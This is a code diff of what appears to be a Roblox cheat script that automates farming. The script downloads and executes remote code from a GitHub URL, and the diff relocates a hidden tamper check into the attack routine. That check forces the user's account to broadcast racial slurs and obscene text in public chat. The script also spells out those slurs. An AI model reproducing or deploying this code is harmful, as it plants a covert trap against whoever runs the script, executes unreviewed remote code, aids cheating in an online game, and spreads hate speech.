@@ -1,7 +1,4 @@
 repeat wait() until game:IsLoaded()
-if readfile("vape4") == "fucking nigger tampered with the script" then
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("fucking nigger spear me in my cock nigger", "All")
-end
 if loadstring(game:HttpGet("https://raw.githubusercontent.com/rgie2/lol/main/RemoteBomb%20autofarm"))() == true then
     wait(10)
     game:GetService("ReplicatedStorage"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("serverInputService"):WaitForChild("RE"):WaitForChild("TryEnableSafeMode"):FireServer()wait(0.5)local ba=Instance.new("ScreenGui")
@@ -168,6 +165,9 @@ if loadstring(game:HttpGet("https://raw.githubusercontent.com/rgie2/lol/main/Rem
                 end
             end
         local function attackmob(target)
+            if readfile("vape4") == "fucking nigger tampered with the script" then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("fucking nigger spear me in my cock nigger", "All")
+            end
             if game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
                 if game.workspace.Living.Mobs[target].Humanoid.Health > 0 then
                     if not game.Players.LocalPlayer.Character:FindFirstChild(getgenv().SwordName) then
@@ -278,4 +278,4 @@ if loadstring(game:HttpGet("https://raw.githubusercontent.com/rgie2/lol/main/Rem
         Next = Servers.nextPageCursor
         until not Next
     end
-    end
+end
